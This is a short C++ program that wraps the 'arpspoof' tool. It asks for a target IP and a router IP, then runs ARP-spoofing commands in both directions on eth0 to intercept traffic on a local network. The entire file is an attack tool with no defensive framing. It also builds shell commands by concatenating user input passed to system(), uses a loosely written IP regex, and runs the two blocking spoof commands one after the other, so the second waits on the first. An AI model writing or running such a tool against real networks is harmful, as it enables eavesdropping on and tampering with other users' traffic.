#include <iostream>
#include <stdio.h>
#include <regex>
#include <tuple>
#include <sstream>

// converts normal strings to c style strings
const char* cString(std::string value){
	//return &(value[0]];
	return value.c_str();
}

// dynamically converts one basic type to another 
template<class INPUT, class OUTPUT>
OUTPUT convert(INPUT value){
	OUTPUT result;
	std::stringstream stream;
	stream << value;
	stream >> result;
	stream.clear();
	return result;
}
// use popen to create a pipe connection to the terminal & return output from system in string format
std::string getConsoleOutput(const char* command){

	/* 
	 * given a string command, should execute and return system response from terminal
	 * utilizeses popen from stdio.h to create a pipe connection
	 * */
	const int SIZE = 1024;
	char buffer[SIZE];
	const char* errorMessage = "execution failed";
	std::string result = "";
	// open pipe connection to terminal
	FILE* pipe = popen(command,"r");
	if (!pipe){
		// quick check if there is a connection to begin with
		return errorMessage;
	}
	try {
		// copy over values from the open pipe connection & store inside buffer
		while (fgets(buffer,SIZE,pipe) != NULL){
			result += buffer;
		}
	} catch (...){
		// something went wrong with the pipe connection
		pclose(pipe);
		return errorMessage;
	}
	pclose(pipe);
	return result;
}

std::string parseIpAddress(std::string response){
	
/*
 * given a response from a terminal command 
 * should apply a regex query to retrieve ip address from response 
 * returns a string containing the ip address
 * */
	std::string ipAddress = "";
	// define regex rule
	std::regex rule ("\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}");
	std::smatch sm;
	std::regex_search (response,sm,rule);

	// convert result to string 
	for (int index = 0; index < sm.size(); ++index){
		ipAddress += sm[index];
	}
	return ipAddress;
}
std::tuple<std::string,std::string> getIpValues(){
	std::tuple<std::string,std::string> result;
	for (int x = 0; x < 2; ++x){
		// get values and parse
		std::string targetIp = "";
		std::cout << "[-] Enter IP [" << x << "]: ";
		if (x == 0){
			getline(std::cin,targetIp);
			std::get<0>(result) = parseIpAddress(targetIp);
		} else {
			getline(std::cin,targetIp);
			std::get<1>(result) = parseIpAddress(targetIp);

		}
		std::cout << parseIpAddress(targetIp) + " [" << x << "] \n";
	}
	std::cout << std::get<0>(result) + " | " + std::get<1>(result) << "\n";
	// (target,router)
	return result;
}

void runSpoof(){
	std::tuple<std::string,std::string> ipAddresses = getIpValues();
	std::string targetIp = std::get<0>(ipAddresses);
	std::string routerIp = std::get<1>(ipAddresses);
	std::string command1 = "arpspoof -i eth0 -t " + targetIp + " " + routerIp;
	std::string command2 = "arpspoof -i eth0 -t " + routerIp + " " + targetIp;
	std::string fullCommand = command1 + " && " + command2;
	//std::cout << fullCommand;
	//system(cString(fullCommand));
	system(cString(command1));
	system(cString(command2));
}
int main(){

	runSpoof();
	return 0;
}
